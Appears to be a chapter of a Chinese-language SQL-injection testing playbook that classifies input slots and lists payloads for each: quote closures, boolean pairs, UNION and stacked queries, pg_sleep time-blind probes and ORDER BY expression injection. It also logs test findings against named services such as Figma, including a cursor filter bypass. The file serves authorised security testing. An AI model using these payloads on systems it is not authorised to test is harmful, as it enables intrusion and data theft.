# 01 · SQL 入参矩阵(★核心)

> 视角:**每个能进 SQL 的输入,以什么身份进**——字符串值?数字?标识符?排序方向?
> 每个槽位 = 一类"入参身份",有各自的合法性断言、逃逸构造、判据。
> 送达通道技术(编码/HPP/JSON 转义等)见 `06-送达与过障.md`,不在此文件。

---

## 一、槽位总表

| 槽位 | SQL 中的样子 | 现实入参例子 | 主判据 |
|---|---|---|---|
| **V1 字符串值位** | `WHERE col = '输入'` | 搜索词 query、字段值 value、emails | 布尔对差分 / quote 错误 |
| **V2 数字值位** | `WHERE id = 输入` / `LIMIT 输入` | id、page_size、org_id、路径 id | 算术参与 / 边界类型消息 |
| **V3 时间值位** | `WHERE created_at > '输入'` | start_time、end_time、date | 格式消息 / 闭合行为 |
| **V4 布尔/类型位** | `... = true` / `... = 输入`(类型混杂) | is_view_only、mode、flag | 类型消息(收到 Array/String) |
| **V5 模式位(LIKE)** | `WHERE name LIKE '%输入%'` | 搜索词(模糊匹配型) | 通配符扩大结果集 |
| **V6 集合位(IN/数组)** | `WHERE id IN (输入列表)` | folder_ids:[]、emails(join 串) | 元素级消息 / 元素差分 |
| **I1 列名位** | `ORDER BY 输入` / `SELECT 输入` | sort_column | 白名单消息 / 字典 miss / 排序变化 |
| **I2 表名/别名位** | `FROM 输入` / `AS 输入` | from、alias、join.as | "not defined"/正则白名单消息 |
| **I3 排序方向位** | `ORDER BY col 输入` | sort_order | 白名单消息(asc/desc 外全拒?) |
| **I4 限制/分页位** | `LIMIT 输入` / `OFFSET 输入` | page_size、offset、limit | 类型消息 / 边界消息 |
| **F1 函数位** | `fn(输入)` | 聚合/转换函数名或参数 | 函数错误消息 |
| **M1 多语句位** | `; 输入` | 任意值位追加 | 延迟/多结果(注意协议级禁用) |
| **X1 二级注入位** | 存储值 → 他处拼接 | CMS 字段、文件名、评论 | 存储读回 + 回放点行为 |

## 二、逐槽位打法与 payload 库

### V1 字符串值位(单引号上下文,最主流)
**构造(按层递进,全部要打)**:
```
闭合测:  '            ''            '--
注释族:  '--(尾空格)   ' #   '/* */   ';--    (PG 里 # 非注释;-- 后必须跟空白)
逻辑对:  ' AND '1'='1   vs   ' AND '1'='2        ← 唯一能判"逻辑参与"的技术
扩集:    ' OR '1'='1'--      ' OR 'x'='x
括号变:  ') OR ('1'='1       ')--
联合:    ' UNION SELECT NULL--
堆叠:    ';SELECT pg_sleep(5)--
(时间:   ' AND pg_sleep(5)-- 或条件式)
```
**判据**:①布尔两发不同=逻辑参与(强信号);②报 quote 类错误=值到达 quote 环节;③全"存活命中"=bind/等价转义或清洗(看 03 处置模式)。
**坑**:先跑判别面校准(入参真影响结果集);"清洗存活"要追清洗规则(试哪些字符存活)。
**实战**:folder_search(清洗存活);CMS items 13/13 字符族读回原样(bind 或等价转义)。

### V2 数字值位(无引号上下文)
**构造**:
```
算术对:  1   vs   2-1        (同资源=算术参与)
布尔对:  1 AND 1=1  vs  1 AND 1=2
扩集:    1 OR 1=1
边界:    2147483647/2147483648(int32)   9223372036854775807/808(int64)
前导零:  009                (报 String 类消息=类型校验层存在)
负数/超大: -1 / 99999999999999999999   (静默空页/宽容=记录)
数字正则族: +1 / 1.0 / 1e5 / 尾空格 / 全角数字 / 非ASCII数字١   (分野:类型解析器 vs ^\d+$ 严格正则)
```
**路径位送达**(同一身份,送达位置在 URL path `/api/xxx/{id}`):变体 `1'`、`1'--`、`1' OR '1'='1`、null、垃圾、超长。判据:全 404/403=路由匹配后权限查找(安全方向);500/SQL 消息=路径位拼接嫌疑;"Integer overflow"/"Non-number"=类型校验层;**畸形 id 打不中合法资源=天然零破坏**。
**判据**:边界或前导零出类型消息→解析层类型校验;算术等效→进了表达式;**`^\d+$` 严格正则**(前导零 01/溢出数字宽容,而 +1/1.0/-1/尾空格/全角/非 ASCII 数字全拒)=数字位是"正则白名单"而非"类型解析器"——细粒度可辨。
**实战**:folder_search org_id(int64 溢出→400 String 消息);folders page_size(abc→"must be a valid number");Figma billing_group_ids(`\d+` 正则:01/20 位溢出→空集,±号/小数点/空白/全角全拒)。

### V3 时间值位
**构造**:闭合+注释(`2026-01-01'--`)、`' OR '1'='1`、同型无效值(`2026-13-45`)、边界(0/负数/未来)。
**判据**:格式校验消息=类型层;SQL 语法错(500 或 SQLSTATE)=进了 SQL 且未参数化(强信号)。
**实战**:activity_logs/export 的 start_time/end_time(待打)。

### V4 布尔/类型位
**构造**:字符串"true"/"1"/"是" 混入布尔位;数组/对象塞进标量位(类型混淆逼消息)。
**判据**:`must be a boolean, received type String` 类消息=类型校验;静默转换=宽容。
**坑**:布尔位在 ORM 里常被强转,注入空间小;价值在**类型消息泄露**(参数映射层证据)。

### V5 模式位(LIKE)
**构造**:`%` `_` `\%` 扩展(`%%%%`)、闭合 `%' OR '1'='1--`。
**判据**:结果集扩大=通配参与;不变=等值语义。
**坑**:搜索型入参先分清"等值"还是"LIKE"——用 `%` 一发即可区分。

### V6 集合位(IN 列表/数组)
**构造**:①数组元素注入(`{"ids":["ok","x'"]}`);②逗号串注入(`a,b'`);③括号闭合(`1) OR (1=1`);④空数组/混合类型数组;⑤逐元素精确匹配探针(合法值+尾空格/NUL/大小写变体/引号附加)。
**判据**:元素级错误消息(报第几个元素);元素差分(某元素被特殊处理);**全量校验**=多元素任一非法→整单拒(错误回显该元素原值);**元素级精确匹配不归一化**(尾空格/NUL 全拒)。
**实战**:CMS imports(fields[] 数组内字段——数组内值同受校验);Figma request_types[](精确白名单 3 值,非法元素整单 400、原值回显)。

**批量端点静默宽容(集合接口)**:无差别 200 空 + 零时延 + 任意元素(含注入/嵌套数组/裸串/foreign key)零差分——后端为"逐元素查库,查不到即忽略"的集合语义。**判别面未激活时(自有数据为空/创建被计划门挡),只记"静默宽容",不得记"参数化安全"**。实战:Figma files/related_links 批量(file_keys[] 全 200 `meta:[]`,pg_sleep 元素零延迟)。

### I1 列名位(ORDER BY 类,标识符上下文)★
**构造(按层递进)**:
```
真列值枚举:  touched_at / created_at / name (已知合法值先对齐)
伪列:        junk_column_xyz      → 看消息("Invalid sort_column parameter"?字典错误?)
注入语法:    name'   name--   name,id   (SELECT 1)   CASE WHEN 1=1 THEN name ELSE id END
引用符逃逸:  "name"   `name`   [name]
```
**判据**:①白名单消息(`Invalid X parameter`)=值级白名单(安全方向);②字典/表错误(`column "x" does not exist`)=**识别后进 SQL 查询字典**(拼接嫌疑层!);③排序实际变化=列名真参与 ORDER BY(但若白名单严格则无缝隙)。
**坑**:标识符位没有"引号闭合"可用(引号里是数据不是语法)——要找的是**引用符/表达式注入点**,前提是校验层缺失;白名单存在时此位直接死,转移目标。
**实战**:folders paginated_files——白名单恰 {name,touched_at,created_at},20+ 畸形全 400,"Invalid sort_column parameter"。

### I2 表名/别名位
**构造**:表名'--、不存在的名、反引号/双引号包裹、逗号追加、点号跨 schema。
**判据**:"table 'x--' not defined"(名字进了字典查询=拼接嫌疑)/ 正则白名单消息(H1:`alias should match [A-Za-z]...`)。
**实战**:H1 DSL(别名正则);box/figma 未发现此位。

### I3 排序方向位
**构造**:`asc` / `desc`(基线)→ `asc'` `asc;--` `ASC` `ascending` `random`(白名单枚举)。
**判据**:白名单消息(枚举外全拒)。
**实战**:folders——严格 {asc,desc},大写都拒。

### I4 限制/分页位
**构造**:数值族(同 V2)+ `1,2`(MySQL 双参)+ `1 OFFSET 2` + 子查询 `(SELECT 1)`。
**判据**:类型消息("must be a valid number")=防线稳;负数静默接受=宽容(记录,值可能不进 SQL)。

### 附:keyset 游标参数组(六件套 · 终版反编译 2026-09-10)★
> 分页游标六件套(Figma versions 实装):**I1 列名位(column/secondary_column)+ V3 时间位(before/after)+ V2 数字位(secondary_before/after)+ V4 类型位(page_size)** 复合载体;缺省 column=**default**;配对校验链:sb 无 sc→"requires secondary_column cursor"、sb 无 before→"cannot include secondary_before without before cursor"、before+after 互斥。

**反编译 WHERE(实证终版)**:date-before=`(created_at > $1) OR (id > $2)`;date-after=`(created_at < $1) OR (id < $2)`;default-before=`id > $1`;无 sb/sa 时 OR 分支消失;**两条件均严格比较**。
**真值机制**:created 内部 µs 精度、显示与 server 游标**截断到秒**(FK2=33.042340s 显示 33;IHt8=23.513342s 显示 23);真值用 **µs 网格二分**勘探(~10 发收敛 1µs)。
**latent OR 显影**:sb 平时被 OR 短路——主条件推超界后:sb=id-1/0→行救回;sb=id→空(严格 `>`)。旁路构造:`before=未来+sb=0` ⇒ 时间过滤全失效(见 06-D2)。
**构造**:
```
column=junk / column=date' / column=date,(SELECT 1)          ← I1 身份:白名单"Invalid column type in cursor object"
before=<时间>' / before=<时间>'-- / before=<时间>' AND 1=1     ← V3 身份:宽容时间解析(尾随引号容忍;乱值→500 快崩)
secondary_before=<id>' / 20位数字 / -1                        ← V2 身份:int64 解析(溢出/引号→500;-1 宽容)
page_size=30' / abc                                          ← V4 身份:类型断言 400
```
**判据(顺序判定)**:①column 报 "Invalid column type in cursor object"=游标对象列名白名单(死);②before 乱值 500 但**快**(<1s)=解析层崩;③**终审:时间盲注**——`before=<时间>' AND 1=(SELECT 1 FROM pg_sleep(3))--` 在拼接假设下语法完全合法,响应快=解析层拦(SQL 未执行),慢=SQL 执行(注入实锤)。Figma versions 实测全快:否决拼接。④**OR 双槽复核**:单独位"无差分"≠不参与,先超界显影再下结论(实证:secondary_before 全程无差分,超界后救回行为显形)。
**坑**:错误消息里的参数名可能只是**文案**——真实参数名必须 JS 逆向确认(实例:file_diff 消息 `fromFileVersionId`,真名 `from_file_version_id`,body/query 用错名永远停在 XOR 报错上)。
**实战**:Figma versions——column 白名单 / before 宽容时间解析 / secondary_before int64 解析 / page_size 断言(ps=100→钳50、1e20→200 Number 语义、0/负→钳1);终审全快⇒双重参数化,SQLi 关闭;唯一旁路=OR 时间过滤全失效(权限门内)。

### F1 函数位
**构造**:函数名替换(如 `count`→`pg_sleep` 直接塞)、参数内嵌套注入。
**判据**:函数不存在错误=名字被查询;类型错误=参数进表达式。
**坑**:REST 场景罕见;DSL/报表/聚合接口里多(如 H1 的表函数位)。

### M1 多语句位
**构造**:`;SELECT 1--`、`';SELECT pg_sleep(5)--`、`;SELECT 1;--`。
**判据**:延迟/多结果=堆叠可用;不变≠安全——**先判协议**:PG 扩展协议/预处理天然禁多语句,负结果注明"协议级禁用"而非"过滤"。
**实战**:Figma 全位置无延迟(sleep 统计组重叠)。

### X1 二级注入位(存储型)★
**流程**:①列"存储点"(哪些入参被原样存库:CMS 字段/名字/评论)②列"回放点"(存值在哪里被读出**再进查询**:搜索/导出/报表/通知)③写入标记 payload ④到回放点观察行为。
**判据**:存储读回(证明存了)+ 回放点差分/错误(证明拼接)。
**实战**:CMS 值→WS 读回(存储原样);下一步找它的回放点(导出/搜索)。

## 三、入参流转链与定位四问(每个项目的第一步)

```
请求参数(外部名) → [解析层:类型/结构断言] → [映射层:外部名→内部名] → 查询构造器(ORM/Builder/手拼)
                                                                         ↓
                                                              SQL 槽位(V1..X1)
```

**定位四问**(对每个候选入参,用四个探针确定它走到哪、进的哪个槽位):
1. **类型断言错→报什么?** 发数组/数字/对象混入 → 错误消息的层级与内部名(C2)。
2. **归一化行为?** 加首尾空白/中间 \x00/大小写变体 → trim?剥离?严格?(C3)
3. **非法枚举值处置?** 白名单拒绝(400)?静默回退(200 默认)?清洗存活(200=base)?(03 处置四模式)
4. **差分校准确认?** 换合法值结果集变吗?→ 确认入参真参与查询(02 判别面校准)。

**入参清单模板(每项目填一张,填完+打完成=全用)**:

| # | 参数名(外部) | 内部名 | 类型 | 推断槽位 | 定位证据 | payload 组 | 结果 |
|---|---|---|---|---|---|---|---|
| 1 | query | ? | string | V1 | 布尔对无差分/清洗存活 | V1 全 | 无信号 |
| 2 | sort_column | ? | enum | I1 | "Invalid sort_column"(白名单) | I1 全 | 无信号(白名单) |
| 3 | file_type | editor_type | enum | V4→V1? | 数组→"editor_type must be string" | V4 全 | 静默回退 |
| … | | | | | | | |

**用法**:①先填表(找 04 的侦察方法)②对每行按"payload 组"逐条打(本文件第二节)③结果列填判读④有缺口继续打,全绿才允许收口。

## 四、全用规则(SQL 入参版)

1. 项目收口时,清单表**每格都有状态**(已打/不适用+原因)。
2. 每个"推断槽位"必须附定位证据(四问之一);无证据的槽位=待定,继续定位。
3. 新技术/新槽位/新构造 → 追加本文件(槽位内编号顺延)+ CHANGELOG。
4. 送达失败 ≠ 入参不存在:换 06 的通道技术再送一遍(编码/结构/参数名)。
